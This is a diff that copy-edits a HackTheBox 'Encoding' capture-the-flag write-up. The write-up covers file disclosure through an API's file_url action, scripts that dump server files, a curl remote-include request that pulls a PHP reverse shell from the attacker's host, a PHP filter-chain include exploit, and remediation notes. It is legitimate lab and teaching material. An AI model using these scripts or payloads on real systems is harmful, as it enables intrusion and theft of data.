@@ -13,7 +13,7 @@ summary: ""
 ---
 HackTheBox Encoding is a Linux machine rated Medium. This machine is flawed with software and data integrity failures(A08:2021), and injection(A03:2021).
 
-Attack Chain: The attacker was able to gain an initial foothold due to directory traversal vulnerability, failed user input validation, and an improper implementation of php include function. Further exploiting an overly permissive right on a sensitive directory enabled the attacker’s gain root user privilege.
+Attack Chain: The attacker was able to gain an initial foothold due to directory traversal vulnerability, failed user input validation, and an improper implementation of php include function. Further exploiting an overly permissive right on a sensitive directory enabled the attacker gain root user privilege.
 #### Initialization
 ```bash
 # connect to vpn
@@ -40,10 +40,10 @@ JQuery[3.6.0]
 ``` 
 
 #### Exploration
-Explored the site and discovered the /index.php takes a page parameter of values `string`, `integer`, `image`, and `api`. I am guessing it may be vulnerable to code injection, file inclusion or path traversal. 
+Explored the site and discovered that /index.php takes a page parameter of values `string`, `integer`, `image`, and `api`. I am guessing it may be vulnerable to code injection, file inclusion or path traversal. 
 ![Home Source Page](/images/encoding/encoding01.png "Home Source Page")
 
-Visted the `http://10.10.11.198/index.php?page=api` which appeared to be data conversion site. This page suggests a domain name for the api so we had to add that to the hosts file. 
+Visted the `http://10.10.11.198/index.php?page=api` which appeared to be a data conversion site. This page suggests a domain name for the api so we had to add that to the hosts file. 
 ```shell
 # add domain and subdomain to hosts file
 echo '10.10.11.198 haxtables.htb' | sudo tee -a /etc/hosts
@@ -51,7 +51,7 @@ echo "10.10.11.198 haxtables.htb" | sudo sed -i 's/haxtables.htb/& api.haxtables
 ```
 
 #### Exploitation
-Studied the page and figured that a few sample python scripts for calling the api could be a foothold vector. Collected these scripts and dubbed them as `str2hex-data_file.py`  and `str2hex-file_url.py`. The former was disclosing information on the attacker's machine while the latter when switched to the `file` scheme disclosed information on the victim's machine. 
+Studied the page and figured that a few sample Python scripts for calling the api could be a foothold vector. Collected these scripts and dubbed them as `str2hex-data_file.py`  and `str2hex-file_url.py`. The former was disclosing information on the attacker's machine while the latter when switched to the `file` scheme disclosed information on the victim's machine. 
 [str2hex-data_file.py](#)
 ```python
 import requests
@@ -80,7 +80,7 @@ print(response.text)
 Create a wordlist of some interesting file paths in linux and modify `str2hex-file_url.py` to automate the dump of these files.
 [modified-str2hex-file_url.py](#)
 ```python
-import requests,sys
+import requests, sys
 
 json_data = {
   'action': 'str2hex',
@@ -149,7 +149,7 @@ mkdir -p {actions,assets/img,includes,scripts}    # create all the sub directori
 for file in $(cat files); do python3 modified-str2hex-file_url.py /var/www/image/$file | jq .data | xxd -r -p > ./image/$file; done 2>&1    # download the files
 
 ```
-This is a very tricky one. I started a python server after creating a php reverse shell named 'index.php' and sent a curl request thus  `curl http://haxtables.htb/index.php?page=http://10.10.14.112:8008/index.php%00` which unfortunately returned haxtable's index.php page. Having earlier exfiltrated the  '000-default.conf' I switched to downloaded all the existing subdomain's index.php pages.
+This is a very tricky one. I started a python server after creating a php reverse shell named 'index.php' and sent a curl request thus  `curl http://haxtables.htb/index.php?page=http://10.10.14.112:8008/index.php%00` which unfortunately returned haxtable's index.php page. Having earlier exfiltrated the  '000-default.conf' I switched to downloading all the existing subdomain's index.php pages.
 
 ```shell
 ## let's download all php files
@@ -161,7 +161,7 @@ python3 modified-str2hex-file_url.py /var/www/html/index.php | jq .data | xxd -r
 mkdir -p api/v3/tools/string
 python3 modified-str2hex-file_url.py /var/www/api/v3/tools/string/index.php | jq .data | xxd -r -p > ./api/v3/tools/string/index.php
 ```
-With some understanding of the code and some research figured out a `curl` format for using the api and correctly passing the data. Also tried several variations of getting a shell on the box but this was unable to.
+With some understanding of the code and some research figured out a `curl` format for using the api and correctly passing the data. Also tried several variations of getting a shell on the box but I was unable to.
 ```php
 # post request formats
 curl -X POST -F "data_file=@index.php" -F "action=file_url" http://api.haxtables.htb/v3/tools/string/index.php
@@ -180,16 +180,16 @@ f = {'data_file' : __import__('webbrowser').open('http://10.10.11.198/index.php'
 response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', data=data, files=f)
 print(response.text)
 ```
-After a lot of trial had to lean on other's shared solution to get pass this blocker using [synactiv's php filter chain generator](https://github.com/synacktiv/php_filter_chain_generator).  Download the repository.
+After a lot of trials had to lean on others' shared solution to get past this blocker using [synactiv's php filter chain generator](https://github.com/synacktiv/php_filter_chain_generator).  Download the repository.
 
 ```shell
 # download a gadget chain generator
 git clone https://github.com/synacktiv/php_filter_chain_generator.git
 ```
-Create a python script to exploit the action_handler.php `include` function.  
+Create a Python script to exploit the action_handler.php `include` function.  
 [attk.py](#)
 ```python
-import requests,sys
+import requests, sys
 
 json_data = {
   'action': 'b64encode',
@@ -290,9 +290,9 @@ codium source
 ```
 #### Remediation
 **Fixing the Foothold Vector**  
-The inbuilt `parse_url` function in the code's `get_url_content` function which appears in all `utils.php` of the html,api, and image folders bypassed a check supposedly meant to deter an attack from manipulating the server.  However the notorious `include` in the `action_handler.php` of image's action folder facilitated the foothold on this box. 
+The inbuilt `parse_url` function in the code's `get_url_content` function which appears in all `utils.php` of the html, api, and image folders bypassed a check supposedly meant to deter an attack from manipulating the server.  However the notorious `include` in the `action_handler.php` of the image's action folder facilitated the foothold on this box. 
 ![Encoding's Host File](/images/encoding/encoding02.png "Encoding's Host File")
-Lets validate our assumptions with a local POC. [parse_url](https://www.php.net/manual/en/function.parse-url) strips the scheme while [gethostbyname](https://www.php.net/manual/en/function.gethostbyname) does an nslookup on the given domain. However passing the url to the `parse_url` function without the http scheme returns nothing which apparently has nothing to be compared against the "127.0.0.1" hence outputs a false value.
+Let's validate our assumptions with a proof of concept. [parse_url](https://www.php.net/manual/en/function.parse-url) strips the scheme while [gethostbyname](https://www.php.net/manual/en/function.gethostbyname) does a nslookup on the given domain. However, passing the url to the `parse_url` function without the http scheme returns nothing which has nothing to compare against "127.0.0.1" and hence the false output value.
 ```php
 php -a
 // first run
@@ -312,7 +312,7 @@ php > curl_setopt($ch, CURLOPT_URL, "image.haxtables.htb"); echo (curl_exec($ch)
 php > exit
 ```
 
-The program on line 25  failed to used the already instantiated domain variable i.e `$domain` and instead used the initially passed `$url` variable in the curl_setopt and since the [curl_exec](https://www.php.net/manual/en/function.curl-exec) implicitly accepts a schemeless url argument the operation successfully executes. The simplest fix would be to pass the value of `$domain`. 
+The program on line 25  failed to use the already instantiated domain variable i.e. `$domain` and instead used the initially passed `$url` variable in the curl_setopt and since the [curl_exec](https://www.php.net/manual/en/function.curl-exec) implicitly accepts a schemeless url argument, the operation successfully executes. The simplest fix would be to pass the value of `$domain`. 
 ```php
 17	function get_url_content($url)
 18	{
@@ -335,7 +335,7 @@ The program on line 25  failed to used the already instantiated domain variable 
 ```
 
 **Fixing the Privilege Escalation Vector**  
-This one is quite obtainable though where an administrator could give a developer right to restart their service. However they were also allowed to write to `/etc/systemd/system/`. 
+This one is quite obtainable though where an administrator could give a developer right to restart their service. However, they were also allowed to write to `/etc/systemd/system/`. 
 ```shell
 ls -ld /etc/systemd/system
 #--snip--#
